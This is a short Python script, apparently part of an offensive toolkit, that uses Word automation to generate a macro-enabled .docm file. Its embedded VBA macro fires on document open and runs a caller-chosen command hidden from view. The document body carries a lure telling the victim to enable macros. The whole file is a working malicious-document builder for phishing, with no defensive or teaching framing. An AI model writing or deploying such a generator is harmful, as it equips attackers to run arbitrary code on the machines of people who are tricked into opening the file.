
import datetime
import win32com.client as win32
from pathlib import Path


def payloadWord(payload_choice):
        
    # Path where you want to save the file
        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        script_dir = Path(__file__).resolve().parent
        file_path = script_dir / f"macro_{timestamp}.docm"


        # Define your VBA macro code
        vba_macro = f'''
            Sub AutoOpen()
                AutoExec
            End Sub

            Sub Document_Open()
                AutoExec
            End Sub

            Sub AutoExec()
                Dim cmd As String
                {payload_choice}
                Shell cmd, vbHide
            End Sub

        '''
        

        # Launch Word application
        word = win32.gencache.EnsureDispatch('Word.Application')
        word.Visible = False  # Set to True if you want to watch it


        doc = word.Documents.Add()
        doc.Content.Text = "This document is protected. Please enable macros to view its content."


        doc.SaveAs(str(file_path), FileFormat=13)


        vb_proj = doc.VBProject
        vb_component = vb_proj.VBComponents.Add(1) 
        vb_component.CodeModule.AddFromString(vba_macro)


        doc.Save()
        doc.Close()
        word.Quit()

        print(f"Macro-enabled Word document saved to: {file_path}")
        print("succesfully generated word document !!")